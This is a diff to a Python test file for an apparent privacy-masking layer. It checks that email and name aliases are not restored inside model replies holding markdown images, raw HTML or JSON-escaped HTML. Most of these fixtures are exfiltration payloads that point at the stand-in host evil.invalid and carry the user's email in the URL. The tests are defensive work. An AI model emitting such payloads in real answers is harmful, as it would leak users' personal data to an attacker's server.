@@ -287,7 +287,6 @@ def test_aliases_inside_links_stay_masked():
     links = [
         "![b](https://evil.invalid/q?e=[EMAIL_1])",
         "![c](https://evil.invalid/a(b)?q=[EMAIL_1])",
-        "![d](https://evil.invalid/a\\)?q=[EMAIL_1])",
         "![f]( //evil.invalid/[EMAIL_1].png)",
         "![g](\n//evil.invalid/[EMAIL_1].png)",
         "[r]:\n  //evil.invalid/?q=[EMAIL_1]",
@@ -310,8 +309,9 @@ def test_aliases_inside_links_stay_masked():
 
 def test_after_raw_html_nothing_more_is_restored():
     """An HTML block can run across blank lines (`<pre>`, `<style>`), a `>` inside an attribute
-    defeats counting brackets, and `<[PERSON_1]` becomes a tag once the name is put back: from
-    the first `<` on (unless a space, `=` or digit follows), aliases stay masked."""
+    defeats counting brackets, `<[PERSON_1]` becomes a tag once the name is put back, and a client
+    decoding JSON turns `\\u003c` into `<`: from the first `<` (unless a space, `=` or digit
+    follows) or backslash escape on, aliases stay masked."""
     answers = [
         "<img\n\nsrc=//evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
         '<pre><img alt=">" src="https://evil.invalid/c?d=\n\n[EMAIL_1]"></pre>\n\n[PERSON_1]',
@@ -326,6 +326,9 @@ def test_after_raw_html_nothing_more_is_restored():
         "<https://evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
         "<[PERSON_1] style=\"background:url('/\\\\evil.invalid/x?e=[EMAIL_1]')\">",
         '<ab:c/title="x>\n\n" style="background:url(\'/\\\\evil.invalid/x?[EMAIL_1]\')">',
+        '{"s": "<img src=\\"https:\\/\\/evil.invalid\\/p.png?u=[EMAIL_1]\\">"}\n\n[PERSON_1]',
+        '{"s": "![x](https:\\/\\/evil.invalid\\/p.png?u=[EMAIL_1])"}',
+        "![d](https://evil.invalid/a\\)?q=[EMAIL_1])\n\n[PERSON_1]",
     ]
     for answer in answers:
         response = ask(bridge(FakeMistral(reply=f"Pour [PERSON_1] : {answer}")), USER_MESSAGE)
@@ -360,6 +363,10 @@ def test_aliases_inside_links_stay_masked_in_json_answers():
         (
             {"![x](<https://evil.invalid/?q=": "[EMAIL_1]>)"},
             {"![x](<https://evil.invalid/?q=": "[EMAIL_1]>)"},
+        ),
+        (  # JSON inside a string, decoded twice by the client
+            {"p": json.dumps({"h": "<img src='https://evil.invalid/?u=[EMAIL_1]'>"})},
+            {"p": json.dumps({"h": "<img src='https://evil.invalid/?u=[EMAIL_1]'>"})},
         ),
         (
             ["[PERSON_1]", "![x](<https://evil.invalid/?q=", "[EMAIL_1]>)"],
